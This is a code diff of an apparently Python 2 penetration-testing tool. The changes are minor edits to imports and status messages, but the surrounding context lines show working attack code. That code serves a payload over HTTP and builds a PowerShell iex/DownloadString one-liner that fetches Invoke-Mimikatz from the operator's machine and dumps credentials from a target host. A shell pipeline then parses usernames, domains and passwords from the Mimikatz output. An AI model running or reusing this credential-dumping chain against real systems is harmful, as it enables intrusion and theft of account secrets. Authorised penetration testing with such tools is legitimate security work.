@@ -4,6 +4,7 @@
 # Released under Apache V2 see LICENCE for more information
 
 import os, argparse, signal, sys, re, binascii, subprocess, string, SimpleHTTPServer, multiprocessing, SocketServer
+import socket, fcntl, struct 
 
 try:
 	from IPy import IP
@@ -28,10 +29,6 @@ from base64 import b64decode
 from socket import *
 from threading import Thread
 from impacket.smbconnection import *
-
-import socket
-import fcntl
-import struct
 
 yesanswers = ["yes", "y", "Y", "Yes", "YES"]
 noanswers = ["no", "NO", "n", "N"]
@@ -252,7 +249,6 @@ def datadump(user, passw, host, path, os_version):
 							exit(1)
 						else:
 							print colored("[+]Found iconv",'green')
-							#os.system("dos2unix "+outputpath+host+"/mimi_creddump.txt 2>/dev/null")
 							os.system("iconv -f utf-16 -t utf-8 "+outputpath+host+"/mimi_creddump.txt > "+outputpath+host+"/mimi_creddump1.txt")
 							print colored("[+]Mimikatz output stored in "+outputpath+host+"/mimi_creddump1.txt",'yellow')
 							print colored("[+]Basic parsed output:",'green')
@@ -285,12 +281,12 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[+]Attempting to Run Safe Mimikatz",'green')
 					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
 					httpd = SocketServer.TCPServer(("",PORT), Handler)
-					print colored("[+]Starting web server on port:"+str(PORT)+"",'green')
+					print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
 					server_process = multiprocessing.Process(target=httpd.serve_forever)
 					server_process.daemon = True
 					server_process.start()	
 					
-					print colored("[+]Creating powershell script in /tmp",'green')
+					print colored("[+]Creating powershell script in /tmp/stealth_mini.ps1",'green')
 					fout=open('/tmp/stealth_mimi.ps1','w')
 
 					line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/Invoke-Mimikatz.ps1')); Invoke-Mimikatz -DumpCreds > c:\\creds.txt"
@@ -310,7 +306,7 @@ def datadump(user, passw, host, path, os_version):
 							print colored("[+]Found iconv",'green')
 							os.system("iconv -f utf-16 -t utf-8 "+outputpath+host+"/creds.txt > "+outputpath+host+"/creds1.txt")
 							# one liner from here: http://lifepluslinux.blogspot.com/2014/09/convert-little-endian-utf-16-to-ascii.html
-							print colored("[+]Creds:",'green')
+							print colored("[+]Basic parsed output:",'green')
 							os.system("cat "+outputpath+host+"/creds1.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
 							print colored("[+]Mimikatz output stored in "+outputpath+host+"/creds1.txt",'yellow')
 							print colored("[+]Clearing up.....","yellow")
